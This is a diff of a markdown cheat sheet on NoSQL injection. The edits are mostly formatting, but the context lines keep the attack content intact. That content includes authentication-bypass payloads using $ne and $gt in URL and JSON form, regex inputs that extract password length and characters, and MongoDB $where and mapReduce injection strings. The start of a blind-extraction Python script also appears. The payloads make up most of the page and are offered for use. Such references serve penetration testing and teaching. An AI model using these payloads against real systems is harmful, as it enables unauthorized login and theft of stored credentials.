@@ -1,10 +1,12 @@
 # NoSQL injection
+
 NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
 
 ## Exploit
 
 Basic authentication bypass using not equal ($ne) or greater ($gt)
-```
+
+```json
 in URL
 username[$ne]=toto&password[$ne]=toto
 
@@ -12,17 +14,18 @@ in JSON
 {"username": {"$ne": null}, "password": {"$ne": null} }
 {"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
 {"username": {"$gt": undefined}, "password": {"$gt": undefined} }
-
 ```
 
 Extract length information
-```
+
+```json
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
 Extract data information
-```
+
+```json
 in URL
 username[$ne]=toto&password[$regex]=m.{2}
 username[$ne]=toto&password[$regex]=md.{1}
@@ -38,6 +41,7 @@ in JSON
 ```
 
 ## Blind NoSQL
+
 ```python
 import requests
 import urllib3
@@ -59,7 +63,8 @@ while True:
 ```
 
 ## MongoDB Payloads
-```
+
+```bash
 true, $where: '1 == 1'
 , $where: '1 == 1'
 $where: '1 == 1'
@@ -79,9 +84,9 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 [$ne]=1
 ```
 
-
 ## Thanks to
- * https://www.dailysecurity.fr/nosql-injections-classique-blind/
- * https://www.owasp.org/index.php/Testing_for_NoSQL_injection
- * https://github.com/cr0hn/nosqlinjection_wordlists
- * https://zanon.io/posts/nosql-injection-in-mongodb
+
+* [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
+* [Testing for NoSQL injection - OWASP](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)
+* [cr0hn - NoSQL injection wordlists](https://github.com/cr0hn/nosqlinjection_wordlists)
+* [Zanon - NoSQL Injection in MongoDB](https://zanon.io/posts/nosql-injection-in-mongodb)
